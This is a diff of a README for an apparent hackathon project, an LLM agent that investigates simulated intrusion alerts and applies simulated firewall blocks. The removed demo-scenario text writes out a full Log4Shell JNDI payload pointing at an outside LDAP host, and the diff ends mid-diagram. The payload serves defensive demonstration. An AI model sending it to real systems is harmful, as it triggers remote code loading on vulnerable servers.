@@ -1,289 +1,468 @@
-# Aegis Security — Enterprise Incident Detection, Investigation & Response
+# 🛡️ Aegis Security — Autonomous SOC Investigation & Response Platform
 
 [![Track](https://img.shields.io/badge/Hackathon-Track%205%3A%20Cybersecurity-059669?style=flat-square)](https://github.com/Sunil56224972/Agies-Security)
 [![Problem Statement](https://img.shields.io/badge/Problem%20Statement-PS--9%20Autonomous%20SOC-2563EB?style=flat-square)](https://github.com/Sunil56224972/Agies-Security)
-[![Database](https://img.shields.io/badge/Database-Neon%20Serverless%20Postgres-00E599?style=flat-square)](https://neon.tech)
-[![Inference Engine](https://img.shields.io/badge/Inference-Groq%20Cloud%20LPU-F59E0B?style=flat-square)](https://groq.com)
-[![Architecture](https://img.shields.io/badge/Agent%20Architecture-ReAct%20Multi--Turn%20Loop-7C3AED?style=flat-square)](https://github.com/Sunil56224972/Agies-Security)
-[![Standards](https://img.shields.io/badge/Standards-NIST%20SP%20800--61%20%7C%20MITRE%20D3FEND-DC2626?style=flat-square)](https://d3fend.mitre.org)
+[![Node.js](https://img.shields.io/badge/Runtime-Node.js%2018%2B-339933?style=flat-square&logo=nodedotjs)](https://nodejs.org)
+[![Database](https://img.shields.io/badge/Database-Neon%20Serverless%20PostgreSQL-00E599?style=flat-square)](https://neon.tech)
+[![Inference](https://img.shields.io/badge/Inference-Groq%20LPU%20%7C%20LLaMA%203.3%2070B-F59E0B?style=flat-square)](https://groq.com)
+[![License](https://img.shields.io/badge/License-MIT-7C3AED?style=flat-square)](LICENSE)
+[![Standards](https://img.shields.io/badge/Standards-NIST%20SP%20800--61%20%7C%20MITRE%20ATT%26CK-DC2626?style=flat-square)](https://attack.mitre.org)
 
-> **Enterprise-grade autonomous Security Operations Center (SOC) investigation and response platform.**  
-> Directly addresses **Track 5 (Cybersecurity) — Problem Statement 9**. Features autonomous multi-turn ReAct reasoning, 8 bidirectional environment tools, distributed state persistence in **Neon PostgreSQL**, dynamic action-observation replanning, objective defense verification, and demonstrable changed-condition / failure handling.
-
----
-
-## Table of Contents
-- [Executive Overview](#executive-overview)
-- [System Architecture & Data Flow](#system-architecture--data-flow)
-- [Common Agentic Requirements Compliance Matrix](#common-agentic-requirements-compliance-matrix)
-- [8 Sandboxed Telemetry Tools](#8-sandboxed-telemetry-tools)
-- [Neon PostgreSQL Database Schema](#neon-postgresql-database-schema)
-- [Interactive Application Views](#interactive-application-views)
-- [Demonstrable Judging Scenarios](#demonstrable-judging-scenarios)
-- [REST & Server-Sent Events (SSE) API Reference](#rest--server-sent-events-sse-api-reference)
-- [Local Setup & Getting Started](#local-setup--getting-started)
-- [License & Security](#license--security)
+> **Enterprise-grade autonomous Security Operations Center (SOC) platform.**  
+> Directly addresses **Track 5 (Cybersecurity) — Problem Statement 9**.  
+> Features a multi-turn ReAct reasoning agent, 8 live environment tools, Neon PostgreSQL state persistence, dynamic replanning on changed conditions, and objective defense verification.
 
 ---
 
-## Executive Overview
+## 📋 Table of Contents
 
-Modern security teams face alert fatigue from high-velocity Network Intrusion Detection Systems (NIDS) like Snort and Suricata. In traditional SOCs, human analysts must manually correlate alerts with asset configuration management databases (CMDB), cross-reference CVE vulnerability feeds, and parse endpoint access logs to verify whether an exploit succeeded or failed.
-
-**Aegis Security** automates Tier-3 triage and containment through a goal-driven autonomous agent. Instead of producing one-shot speculative text, Aegis decomposes high-level incident response objectives into a multi-turn ReAct loop that:
-1. **Ingests & Decodes:** Extracts L7 packet payloads from raw sensor PCAP streams.
-2. **Correlates CMDB & CVEs:** Identifies target operating systems, installed package versions, and vulnerability prerequisites.
-3. **Validates Ground Truth:** Audits web access logs, authentication logs, and EDR process execution trees on the target server.
-4. **Enforces Containment:** Deploys simulated perimeter firewall drop rules to isolate compromised nodes or block attacker IPs.
-5. **Verifies Defense State:** Probes the Netfilter kernel simulator to objectively prove packets from the adversary IP are dropped.
-6. **Records State in Neon PostgreSQL:** Commits auditable investigation reports with MITRE ATT&CK mappings and confidence scores.
-
----
-
-## System Architecture & Data Flow
-
-```
-                                  AEGIS SECURITY PLATFORM
-                                 ─────────────────────────
-                                 
-      ┌────────────────────────────────────────────────────────────────────────┐
-      │                         NETWORK SENSOR INGESTION                       │
-      │   Snort / Suricata NIDS Event Stream ──► Ingress Telemetry Queue       │
-      └───────────────────────────────────┬────────────────────────────────────┘
-                                          │
-                                          ▼
-      ┌────────────────────────────────────────────────────────────────────────┐
-      │               AUTONOMOUS SOC REASONING KERNEL (GROQ LPU)               │
-      │   Model: LLaMA 3.3 70B / 3.1 8B via Groq Cloud High-Speed LPU          │
-      │   Loop: Multi-Turn ReAct (Reasoning ──► Tool Call ──► Observation)     │
-      └─────────┬─────────────────────────┬──────────────────────────┬─────────┘
-                │                         │                          │
-   [Observation Feedback]          [Tool Dispatch]            [State Commit]
-                │                         │                          │
-                ▼                         ▼                          ▼
- ┌───────────────────────────┐ ┌──────────────────────┐ ┌──────────────────────┐
- │   8 SANDBOX SOC TOOLS     │ │  NETFILTER SIMULATOR │ │   NEON POSTGRESQL    │
- │ - ingest_nids_alerts      │ │ - iptables DROP rule │ │ - soc_alerts         │
- │ - get_packet_metadata     │ │ - Connection RST     │ │ - soc_assets         │
- │ - lookup_asset_inventory  │ │ - Packet drop probe  │ │ - soc_cve_kb         │
- │ - query_cve_kb            │ │ - Counter increment  │ │ - soc_firewall_rules │
- │ - query_server_logs       │ └──────────────────────┘ │ - soc_investigations │
- │ - execute_firewall_action │                          │ - soc_server_logs    │
- │ - verify_defense_state    │                          │ - execution_logs     │
- │ - record_investigation    │                          │ - app_config         │
- └───────────────────────────┘                          └──────────────────────┘
-```
+- [Demo Video](#-demo-video)
+- [Screenshots](#-screenshots)
+- [Source Code](#-source-code)
+- [Dependencies](#-dependencies)
+- [Environment Configuration](#-environment-configuration)
+- [Setup Instructions](#-setup-instructions)
+- [Architecture Documentation](#-architecture-documentation)
+- [Common Agentic Requirements Compliance](#-common-agentic-requirements-compliance)
+- [API Reference](#-api-reference)
 
 ---
 
-## Common Agentic Requirements Compliance Matrix
+## 🎬 Demo Video
 
-The platform is designed and evaluated strictly against the hackathon **Common Agentic Requirements**:
+**Workflow:** `Goal → Decision → Action → Intermediate Result → Adaptation → Final Outcome`
 
-| # | Common Agentic Requirement | Live Platform Implementation | Ground-Truth Verification |
-|---|---|---|---|
-| **1** | **Goal-driven execution rather than one-shot answer generation** | Accepts high-level operational goals (e.g. `"Investigate NIDS alert ALERT-2026-9001 to establish whether the attack succeeded or failed..."`) and autonomously orchestrates a multi-turn ReAct loop (up to 16 reasoning turns) to reach a verified outcome. | Live SSE stream (`/api/soc/investigate/stream`) exposes each intermediate decision, tool call, and evidence synthesis. |
-| **2** | **Meaningful tool/environment interaction** | Interacts bidirectionally with 8 production-grade environment tools querying Neon PostgreSQL, inspecting PCAPs, parsing Apache/Tomcat logs, querying CVE intelligence, and controlling Netfilter drop tables. | Real SQL queries executed on Neon PostgreSQL (AWS `ap-southeast-1`); zero mocked static responses. |
-| **3** | **Persistent task state across turns & sessions** | All intermediate reasoning steps, tool arguments, outputs, MITRE ATT&CK classifications, confidence scores, and firewall states persist across turns in Neon PostgreSQL. | Live audit tables: `soc_investigations`, `soc_firewall_rules`, `execution_logs`, `chat_sessions`, `chat_messages`. |
-| **4** | **Action followed by observation/feedback, with replanning** | The agent systematically inspects tool execution observations. If server logs show HTTP 401/404 or runtime software does not match exploit prerequisites, the agent detects the condition mismatch and dynamically replans its hypothesis. | Demonstrated live in `AutonomousSocAgent.investigate()`. |
-| **5** | **Verification of final outcome against objective constraints** | Containment actions are not assumed to succeed upon dispatch. An objective evaluator (`verify_defense_state`) triggers a live probe against the Netfilter sandbox (`/api/soc/firewall/probe`) to confirm `connection_state: RST_SENT_PACKETS_DROPPED`. | Returns real kernel packet drop counts and timestamped verification proofs. |
-| **6** | **Demonstrable failure, conflict, or changed-condition scenario** | **Scenario 6A (Incompatible Stack / Changed Condition):** Adversary fires Log4j exploit (`ALERT-2026-9003`) at `10.0.4.22`. The agent queries CMDB, identifies target is **Python 3.10 / FastAPI** (no Java/Log4j runtime), inspects logs (HTTP 401), detects mismatch, **replans to `FALSE_POSITIVE`**, and avoids blocking the host.<br>**Scenario 6B (Conflict & Human Override):** Human analyst submits ground-truth override via `/api/soc/override`, triggering automated policy adaptation. | 1-Click executable in the **Agentic Evaluation Matrix** tab. The live terminal displays condition detection and replanning rationale. |
-| **7** | **Open architecture: participant freedom** | Modular enterprise architecture: Network Ingestion Sensor $\rightarrow$ Autonomous Groq LPU Reasoning Kernel $\rightarrow$ 8 Tool Executors $\rightarrow$ Neon PostgreSQL State Store $\rightarrow$ Netfilter Containment Simulator. | Fully documented via `/api/health` and `/api/soc/config`. Supports autonomous single-agent triage and multi-agent supervisor/worker scaling. |
+> The video demonstrates one complete investigation of a Log4Shell RCE attack **plus** a failure/unexpected condition — where the agent detects an incompatible runtime stack (Log4j exploit fired at a Python/FastAPI server) and dynamically replans its verdict to `FALSE_POSITIVE` instead of triggering an erroneous firewall block.
 
----
+📹 **[`demo_video/aegis_demo_4min.mp4`](demo_video/aegis_demo_4min.mp4)** — H.264 MP4, ~10 MB
 
-## 8 Sandboxed Telemetry Tools
-
-The agent has access to 8 deterministic tools registered with the LLM via OpenAI/Groq function calling specifications:
-
-```json
-[
-  {
-    "name": "ingest_nids_alerts",
-    "description": "Ingest and list simulated NIDS, Snort, and Suricata intrusion detection alerts. Returns alert signatures, source IP, destination IP, port, and severity."
-  },
-  {
-    "name": "get_packet_metadata",
-    "description": "Retrieve low-level packet metadata, protocol flags, headers, and raw hex/decoded packet payload captured by the network sensor for a given alert."
-  },
-  {
-    "name": "lookup_asset_inventory",
-    "description": "Look up target host asset information from the CMDB/Asset Inventory: OS family and version, running services, open ports, installed software packages, and WAF protection status."
-  },
-  {
-    "name": "query_cve_kb",
-    "description": "Query the synthetic CVE Knowledge Base for vulnerability intelligence: CVSS score, affected products and versions, exploit vectors, prerequisites, and remediation guidelines."
-  },
-  {
-    "name": "query_server_logs",
-    "description": "Retrieve web server access logs, Linux auth.log, syslog, or EDR process execution trees from the target server around the alert timestamp to verify whether the exploit actually executed."
-  },
-  {
-    "name": "execute_firewall_action",
-    "description": "Execute a simulated perimeter firewall or host containment response action in the security sandbox. Adds a drop rule to prevent further lateral movement or C2 beaconing."
-  },
-  {
-    "name": "verify_defense_state",
-    "description": "Simulate a post-action environmental re-check to confirm that the firewall/isolation rule is active and packets from the adversary IP are being dropped."
-  },
-  {
-    "name": "record_investigation_verdict",
-    "description": "Commit the final evidence-backed incident assessment to the SOC database with attack outcome determination, confidence score, MITRE ATT&CK mapping, and actions taken."
-  }
-]
-```
+| Timestamp | Phase | Description |
+|-----------|-------|-------------|
+| `0:00` | **GOAL** | Live dashboard — real-time PostgreSQL metrics, MTTD, MTTR |
+| `0:40` | **DECISION** | Alert feed — 4 NIDS threats; agent selects `ALERT-2026-9001` (Log4Shell CRITICAL) |
+| `1:15` | **ACTION** | 8 SOC tools invoked autonomously (CMDB, CVE-KB, packet metadata, server logs) |
+| `1:20` | **INTERMEDIATE RESULT** | HTTP 200 log + EDR confirms `java` spawned `/bin/sh` reverse shell |
+| `3:00` | **FINAL OUTCOME** | Attacker IP blocked; Netfilter probe shows `RST_SENT_PACKETS_DROPPED` |
+| `3:25` | ⚡ **FAILURE / UNEXPECTED** | `ALERT-2026-9003`: Log4j vs. Python FastAPI → incompatible stack → agent replans to `FALSE_POSITIVE` |
+| `3:50` | **ADAPTATION** | Agentic Evaluator verifies all 7 compliance criteria with live data |
 
 ---
 
-## Neon PostgreSQL Database Schema
+## 📸 Screenshots
 
-The database runs on **Neon Serverless PostgreSQL** (AWS `ap-southeast-1`), connected via the `@neondatabase/serverless` and `pg` pooler. All tables are created automatically on boot:
-
-| Table Name | Description | Key Columns |
-|---|---|---|
-| `soc_alerts` | Ingested NIDS events | `alert_id`, `signature`, `category`, `severity`, `source_ip`, `dest_ip`, `dest_port`, `protocol`, `raw_payload`, `status` |
-| `soc_assets` | CMDB asset inventory | `ip_address`, `hostname`, `os_family`, `os_version`, `running_services`, `installed_packages`, `criticality`, `waf_enabled`, `last_scanned` |
-| `soc_cve_kb` | Vulnerability intelligence | `cve_id`, `title`, `cvss_score`, `affected_products`, `description`, `exploit_prerequisites`, `remediation` |
-| `soc_server_logs` | Endpoint telemetry | `host_ip`, `log_type`, `timestamp`, `status_code`, `request_method`, `request_uri`, `response_bytes`, `client_ip`, `raw_entry` |
-| `soc_firewall_rules` | Containment drop rules | `rule_id`, `target_ip`, `action`, `reason`, `enacted_by`, `is_active`, `packets_dropped`, `created_at` |
-| `soc_investigations` | Incident assessments | `investigation_id`, `alert_id`, `target_ip`, `attacker_ip`, `attack_outcome`, `confidence_score`, `mitre_tactic`, `mitre_technique`, `evidence_summary`, `actions_taken`, `human_override` |
-| `execution_logs` | Full audit trace | `session_id`, `step_type`, `label`, `detail`, `tool_name`, `tool_args`, `tool_result`, `duration_ms` |
-| `tool_usage_stats` | Tool performance metrics | `tool_name`, `total_calls`, `total_successes`, `total_failures`, `avg_duration_ms`, `last_used_at` |
-| `app_config` | Persistent policies | `key`, `value`, `updated_at` |
-| `chat_sessions` | Session management | `id`, `title`, `created_at`, `updated_at` |
-| `chat_messages` | Message transcripts | `id`, `session_id`, `role`, `content`, `tool_name`, `tool_args`, `created_at` |
-
----
-
-## Interactive Application Views
-
-The user interface follows a B2B security architecture styled after **CrowdStrike Falcon**, **Datadog Cloud SIEM**, and **Palo Alto Networks Cortex**:
-
-### 1. Executive Incident Dashboard (`#view-dashboard`)
-Real-time sensor telemetry KPIs, Mean Time to Detect (MTTD < 1.4s), Mean Time to Respond (MTTR < 3.2s), response lifecycle progress bar, verified assessments table, and 1-click defense probe launcher.
+### Executive Incident Dashboard
 ![Executive Incident Dashboard](screenshots/enterprise_dashboard_clean.png)
 
-### 2. Threat Alert Ingestion Feed (`#view-alerts`)
-Filterable intrusion alert queue with severity chips (`CRITICAL`, `HIGH`, `ALL`), inline raw payload inspection drawer, and manual test event ingestion modal.
+### Threat Alert Ingestion Feed
 ![Threat Alert Feed](screenshots/enterprise_alerts_clean.png)
 
-### 3. Incident Investigation Studio (`#view-agent`)
-Autonomous reasoning pipeline displaying a live execution checklist across all 8 security tools, step-by-step tool latency registry, and markdown incident assessment report with analyst override capabilities.
+### Autonomous Investigation Studio
 ![Investigation Studio](screenshots/enterprise_investigation_clean.png)
 
-### 4. Active Containment Rules & Netfilter Defense (`#view-firewall`)
-Production perimeter firewall table with rule toggles (`ACTIVE` $\leftrightarrow$ `DISABLED`), manual rule deployment form, and live defense verification probes.
+### Active Containment Rules & Defense Probe
 ![Active Containment Rules](screenshots/enterprise_containment_clean.png)
 
-### 5. Asset Inventory (CMDB) & CVE Knowledge Base (`#view-architecture`)
-Monitored infrastructure inventory with running services, open ports (80, 443, 5000, 8080), WAF status, and live-searchable CVE intelligence matrix.
+### Asset CMDB & CVE Knowledge Base
 ![Asset CMDB and CVE Intelligence](screenshots/enterprise_assets_clean.png)
 
-### 6. Agentic Evaluation Matrix & Hackathon Judging Cockpit (`#view-evaluator`)
-Dedicated compliance cockpit validating all 7 Common Agentic Requirements with live terminal streaming, objective defense verifiers, and demonstrable changed-condition scenarios.
+### Agentic Compliance Evaluator (All 7 Criteria)
 ![Agentic Evaluation Matrix](screenshots/agentic_matrix_top_1789240873187.png)
 
-### 7. Real-Time Perimeter Defense Verification
-Objective evaluator probe dynamically incrementing drop counters and validating kernel Netfilter drop rules in Neon PostgreSQL.
-![Perimeter Defense Probe](screenshots/tab1_dashboard_probe_1789241140101.png)
+### Global Search
+![Global Search](screenshots/enterprise_search_clean.png)
 
 ---
 
-## Demonstrable Judging Scenarios
+## 💻 Source Code
 
-Built specifically for live hackathon evaluation and technical review:
+### Repository Structure
 
-### Scenario 6A: Changed Condition / Incompatible Stack Failure
-1. **Trigger:** Click `Execute Scenario 6A (Incompatible Stack Demo)` in the Agentic Evaluation Matrix, or investigate alert `ALERT-2026-9003`.
-2. **Context:** Adversary launches a Log4j JNDI RCE exploit (`${jndi:ldap://45.154.255.89:1389/Exploit}`) against target host `10.0.4.22`.
-3. **Tool Invocations:**
-   - `lookup_asset_inventory(ip_address="10.0.4.22")` $\rightarrow$ Target runs **Python 3.10 / FastAPI / Uvicorn** on Debian 11. No Java runtime or Log4j core package exists.
-   - `query_server_logs(host_ip="10.0.4.22", log_type="http_access")` $\rightarrow$ Target web server returned **HTTP 401 Unauthorized**. No socket connection was established.
-4. **Dynamic Replanning:** The agent detects the condition mismatch: the attack signature is Log4j RCE, but the target environment is completely incompatible. Rather than enforcing an unnecessary IP block, the agent **replans its plan**, classifies the incident as **`FALSE_POSITIVE / INCOMPATIBLE_STACK`**, and avoids disrupting valid network traffic.
-
-### Scenario 6B: Conflict & Human Analyst Feedback Adaptation
-1. **Trigger:** Click `Execute Scenario 6B (Analyst Conflict Override)`.
-2. **Context:** A lead security analyst reviews an automated assessment and determines through external intelligence that an attack payload was neutralized upstream.
-3. **Execution:** The analyst submits an override via `POST /api/soc/override`. The system records the feedback in Neon PostgreSQL, dynamically updates the ground-truth outcome, and adjusts perimeter firewall rules accordingly.
-
----
-
-## REST & Server-Sent Events (SSE) API Reference
-
-| Endpoint | Method | Description |
-|---|---|---|
-| `/api/health` | `GET` | Platform health, Neon DB connection status, registered tools, and uptime |
-| `/api/soc/stats` | `GET` | Aggregated SOC telemetry metrics, alert breakdowns, and MTTR/MTTD |
-| `/api/soc/agentic-status` | `GET` | Operational compliance status and metrics for all 7 Common Agentic Requirements |
-| `/api/soc/alerts` | `GET`, `POST` | List alerts (with severity filter) or ingest new test intrusion event |
-| `/api/soc/alerts/:id` | `GET` | Fetch specific alert with decoded L7 payload |
-| `/api/soc/assets` | `GET` | Query CMDB asset inventory with OS, services, and WAF status |
-| `/api/soc/cve` | `GET` | Query CVE intelligence knowledge base with keyword search (`?q=...`) |
-| `/api/soc/logs` | `GET` | Retrieve server access logs, auth logs, or EDR process logs |
-| `/api/soc/firewall` | `GET` | Fetch active Netfilter perimeter containment rules |
-| `/api/soc/firewall/rule` | `POST` | Deploy manual firewall drop/isolate containment rule |
-| `/api/soc/firewall/toggle` | `POST` | Toggle containment rule state (`is_active: true/false`) |
-| `/api/soc/firewall/probe` | `POST` | Execute objective defense probe validating packet drop rules |
-| `/api/soc/investigations` | `GET` | Retrieve historical verified incident assessment reports |
-| `/api/soc/investigate/stream` | `POST` | Real-time Server-Sent Events (SSE) stream of autonomous agent ReAct loop |
-| `/api/soc/override` | `POST` | Record human analyst override and adapt ground-truth assessment |
-| `/api/soc/config` | `GET`, `POST` | Retrieve or update system policy thresholds and reasoning depth |
-| `/api/search` | `GET` | Global real-time search across alerts, rules, and network assets |
-
----
-
-## Local Setup & Getting Started
-
-### Prerequisites
-- Node.js 18+ (tested on Node v20/v22/v25)
-- Groq Cloud API Key (`groq-sdk` ^1.6.0)
-- Neon Serverless PostgreSQL database connection string
-
-### 1. Clone & Install Dependencies
-```bash
-git clone https://github.com/Sunil56224972/Agies-Security.git
-cd Agies-Security
-npm install
+```
+Agies-Security/
+├── server.js              # Main Express backend + AutonomousSocAgent kernel
+├── init_db.sql            # PostgreSQL schema DDL + seed data
+├── package.json           # npm manifest
+├── .env.example           # Environment variable template
+├── public/
+│   ├── index.html         # Single-page application shell
+│   └── script.js          # Frontend dashboard, agent chat, evaluator UI
+├── screenshots/           # Application screenshots for README
+├── demo_video/
+│   ├── aegis_demo_4min.mp4    # Official 4-minute MP4 demo recording
+│   └── record_demo.js         # Playwright recording automation script
+├── docs/
+│   └── walkthrough.md     # Detailed technical walkthrough
+└── LICENSE
 ```
 
-### 2. Configure Environment Variables
-Copy `.env.example` to `.env`:
+### Key Source Files
+
+| File | Purpose |
+|------|---------|
+| [`server.js`](server.js) | Express REST server, `AutonomousSocAgent` ReAct loop, 8 tool executors, SSE streaming, Neon PostgreSQL integration |
+| [`public/script.js`](public/script.js) | Frontend SPA — dashboard, alert feed, investigation studio, firewall view, agentic evaluator |
+| [`public/index.html`](public/index.html) | HTML shell with dark-mode SOC UI layout |
+| [`init_db.sql`](init_db.sql) | Full PostgreSQL DDL: 11 tables + seed alerts, assets, CVEs, and server logs |
+| [`.env.example`](.env.example) | All required environment variables with descriptions |
+
+---
+
+## 📦 Dependencies
+
+### Runtime Dependencies
+
+```json
+{
+  "express": "^4.18.2",
+  "groq-sdk": "^1.6.0",
+  "@neondatabase/serverless": "^0.10.4",
+  "pg": "^8.13.3",
+  "dotenv": "^16.4.7",
+  "cors": "^2.8.5",
+  "ffmpeg-static": "^5.2.0"
+}
+```
+
+| Package | Version | Purpose |
+|---------|---------|---------|
+| `express` | ^4.18.2 | HTTP server, REST routing, SSE middleware |
+| `groq-sdk` | ^1.6.0 | LLaMA 3.3 70B inference via Groq LPU API |
+| `@neondatabase/serverless` | ^0.10.4 | Neon PostgreSQL WebSocket driver (edge-compatible) |
+| `pg` | ^8.13.3 | PostgreSQL connection pool + standard TCP driver |
+| `dotenv` | ^16.4.7 | `.env` environment variable loader |
+| `cors` | ^2.8.5 | Cross-Origin Resource Sharing headers |
+| `ffmpeg-static` | ^5.2.0 | Bundled ffmpeg binary (demo video conversion) |
+
+### Dev Dependencies
+
+| Package | Version | Purpose |
+|---------|---------|---------|
+| `playwright` | ^1.63.0 | Browser automation for demo video recording |
+
+---
+
+## ⚙️ Environment Configuration
+
+Copy `.env.example` to `.env` and fill in your credentials:
+
 ```bash
 cp .env.example .env
 ```
-Edit `.env` with your credentials:
+
+### `.env` Variables
+
 ```ini
-# Groq LPU Inference API Key (https://console.groq.com)
+# ─────────────────────────────────────────────────────────
+# GROQ LPU INFERENCE (required)
+# Get your free key at: https://console.groq.com
+# ─────────────────────────────────────────────────────────
 GROQ_API_KEY=gsk_your_groq_api_key_here
 
-# Groq Model Identifier (default: llama-3.3-70b-versatile)
+# Groq model to use (recommended: llama-3.3-70b-versatile)
 GROQ_MODEL=llama-3.3-70b-versatile
 
-# Application Port
+# ─────────────────────────────────────────────────────────
+# NEON POSTGRESQL DATABASE (required)
+# Create a free database at: https://neon.tech
+# Copy the connection string from Neon Console → Connection Details
+# ─────────────────────────────────────────────────────────
+DATABASE_URL=postgresql://neondb_owner:your_password@ep-your-endpoint.aws.neon.tech/neondb?sslmode=require
+
+# ─────────────────────────────────────────────────────────
+# SERVER (optional, defaults shown)
+# ─────────────────────────────────────────────────────────
 PORT=3000
-
-# Neon Serverless PostgreSQL Database Connection String
-DATABASE_URL=postgresql://neondb_owner:your_password@ep-your-instance.aws.neon.tech/neondb?sslmode=require
 ```
 
-### 3. Database Bootstrap (Automatic & Manual)
-- **Automatic on Startup (Recommended):** On boot, `server.js` automatically executes `CREATE TABLE IF NOT EXISTS` for all 11 tables and seeds default CMDB assets, CVE knowledge base entries, and baseline NIDS alerts if tables are empty.
-- **Manual Seed SQL:** You can also run [`init_db.sql`](init_db.sql) directly inside the Neon SQL Console to review the full DDL schema and seed dataset.
+### How to get the credentials
 
-### 4. Start the Platform
-```bash
-npm start
-```
-The server will boot, run `db.init()`, establish the Neon PostgreSQL pool, and bind to `http://localhost:3000`.
+| Variable | Where to get it |
+|----------|----------------|
+| `GROQ_API_KEY` | Sign up at [console.groq.com](https://console.groq.com) → API Keys → Create key |
+| `DATABASE_URL` | Sign up at [neon.tech](https://neon.tech) → New Project → Connection Details → copy the **Pooler** connection string |
 
-### 5. Verify in Browser
-Open `http://localhost:3000` in any modern web browser:
-- Navigate to **Incident Dashboard** to observe live telemetry.
-- Go to **Agentic Evaluation Matrix** and click **Run Automated Compliance Check** to verify all 7 requirements.
+> **Security note:** Never commit your `.env` file. It is listed in `.gitignore` by default.
 
 ---
 
-## License & Security
+## 🚀 Setup Instructions
+
+### Prerequisites
+
+- **Node.js** v18 or higher ([download](https://nodejs.org))
+- **npm** v9 or higher (bundled with Node.js)
+- A free **Groq Cloud** API key — [console.groq.com](https://console.groq.com)
+- A free **Neon PostgreSQL** database — [neon.tech](https://neon.tech)
+
+---
+
+### Step 1 — Clone the repository
+
+```bash
+git clone https://github.com/Sunil56224972/Agies-Security.git
+cd Agies-Security
+```
+
+---
+
+### Step 2 — Install dependencies
+
+```bash
+npm install
+```
+
+---
+
+### Step 3 — Configure environment variables
+
+```bash
+cp .env.example .env
+```
+
+Open `.env` in any text editor and set:
+- `GROQ_API_KEY` — your Groq Cloud API key
+- `DATABASE_URL` — your Neon PostgreSQL connection string
+
+---
+
+### Step 4 — Bootstrap the database
+
+**Option A — Automatic (recommended):**  
+The server auto-creates all 11 tables and seeds baseline data on first boot. No manual steps needed.
+
+**Option B — Manual:**  
+Run [`init_db.sql`](init_db.sql) directly in the [Neon SQL Console](https://console.neon.tech):
+```bash
+# Copy the contents of init_db.sql and paste into Neon Console → SQL Editor → Run
+```
+
+---
+
+### Step 5 — Start the platform
+
+```bash
+npm start
+```
+
+Expected output:
+```
+  ╔══════════════════════════════════════════════════════╗
+  ║      AEGIS SECURITY — AUTONOMOUS SOC PLATFORM        ║
+  ║      Track 5: Cybersecurity - Problem Statement 9    ║
+  ╚══════════════════════════════════════════════════════╝
+
+  Server running at http://localhost:3000
+  Sandbox Tools loaded: 8
+  Model: llama-3.3-70b-versatile via Groq LPU
+  Database: connected (Neon PostgreSQL)
+```
+
+---
+
+### Step 6 — Open in browser
+
+```
+http://localhost:3000
+```
+
+| Tab | What to do |
+|-----|-----------|
+| **Incident Dashboard** | View live metrics pulled from Neon PostgreSQL |
+| **Threat Alerts** | See all 4 NIDS threats; click **Triage & Investigate** on ALERT-2026-9001 |
+| **Investigation Studio** | Watch the agent reason through 8 tools in real time |
+| **Containment Rules** | View active firewall rules; click **Run Defense Probe** |
+| **Agentic Evaluator** | Click **Run Full Compliance Check** to verify all 7 requirements live |
+
+---
+
+### Step 7 — Verify the API health endpoint
+
+```bash
+curl http://localhost:3000/api/health
+```
+
+Expected response:
+```json
+{
+  "status": "operational",
+  "service": "Autonomous SOC Investigation & Response Platform",
+  "model": "llama-3.3-70b-versatile",
+  "database": "connected",
+  "sandbox_tools": [
+    "ingest_nids_alerts", "get_packet_metadata", "lookup_asset_inventory",
+    "query_cve_kb", "query_server_logs", "execute_firewall_action",
+    "verify_defense_state", "record_investigation_verdict"
+  ]
+}
+```
+
+---
+
+## 🏗️ Architecture Documentation
+
+### System Overview
+
+```
+                         AEGIS SECURITY PLATFORM
+                        ─────────────────────────
+
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                   NETWORK SENSOR INGESTION                       │
+    │   Snort / Suricata NIDS Event Stream ──► Ingress Alert Queue     │
+    └────────────────────────────┬────────────────────────────────────┘
+                                 │
+                                 ▼
+    ┌─────────────────────────────────────────────────────────────────┐
+    │           AUTONOMOUS SOC REASONING KERNEL (GROQ LPU)             │
+    │   Model : LLaMA 3.3 70B via Groq Cloud High-Speed LPU            │
+    │   Loop  : Multi-Turn ReAct (Reason ──► Tool Call ──► Observe)    │
+    │   Max   : 16 reasoning turns per investigation                   │
+    └──────────┬─────────────────┬───────────────────────┬────────────┘
+               │                 │                       │
+    [Observation Feedback]  [Tool Dispatch]        [State Commit]
+               │                 │                       │
+               ▼                 ▼                       ▼
+ ┌──────────────────────┐ ┌─────────────────┐ ┌──────────────────────┐
+ │  8 SOC SANDBOX TOOLS │ │ NETFILTER KERNEL│ │   NEON POSTGRESQL    │
+ │                      │ │   SIMULATOR     │ │   (AWS ap-southeast) │
+ │ ingest_nids_alerts   │ │                 │ │                      │
+ │ get_packet_metadata  │ │ iptables DROP   │ │ soc_alerts           │
+ │ lookup_asset_inv.    │ │ Connection RST  │ │ soc_assets           │
+ │ query_cve_kb         │ │ Packet counter  │ │ soc_cve_kb           │
+ │ query_server_logs    │ │ Probe endpoint  │ │ soc_firewall_rules   │
+ │ execute_firewall_act │ └─────────────────┘ │ soc_investigations   │
+ │ verify_defense_state │                     │ soc_server_logs      │
+ │ record_investigation │                     │ execution_logs       │
+ └──────────────────────┘                     │ tool_usage_stats     │
+                                              │ app_config           │
+                                              │ chat_sessions        │
+                                              └──────────────────────┘
+```
+
+### Investigation Workflow
+
+```
+  ALERT RECEIVED
+       │
+       ▼
+  [GOAL SET] ─────────────────────────────────────────────────────────────────┐
+  "Investigate ALERT-2026-9001. Determine if attack succeeded. Contain."       │
+       │                                                                        │
+       ▼                                                                        │
+  [DECISION] ── Which tools to call? In what order?                            │
+       │                                                                        │
+       ├──► ingest_nids_alerts()     → Alert signature, severity, IPs          │
+       │                                                                        │
+       ├──► get_packet_metadata()    → L7 payload: ${jndi:ldap://...}          │
+       │                                                                        │
+       ├──► lookup_asset_inventory() → Ubuntu 22.04, log4j-2.14.1 installed ✓ │
+       │                                                                        │
+       ├──► query_cve_kb()           → CVE-2021-44228, CVSS 10.0, RCE CRITICAL │
+       │                                                                        │
+       ├──► query_server_logs()      → HTTP 200 + EDR: java spawned /bin/sh    │
+       │                                                                        │
+  [INTERMEDIATE RESULT] ────────────────────────────────────────────────────── │
+  Attack confirmed. Java process spawned reverse shell.                         │
+       │                                                                        │
+       ├──► execute_firewall_action() → BLOCK 185.220.101.45                   │
+       │                                                                        │
+       ├──► verify_defense_state()   → connection_state: RST_SENT              │
+       │                                                                        │
+       ├──► record_investigation()   → Verdict: VERIFIED_ATTACK, Confidence 96%│
+       │                                                                        │
+  [FINAL OUTCOME] ────────────────────────────────────────────────────────────┘
+  MITRE: TA0001/T1190 (Initial Access / Exploit Public-Facing Application)
+  Containment: ACTIVE. Attacker blocked. Investigation committed to PostgreSQL.
+```
+
+### Changed Condition / Failure Handling (Criterion 6)
+
+```
+  ALERT-2026-9003: Log4j exploit → 10.0.4.22
+       │
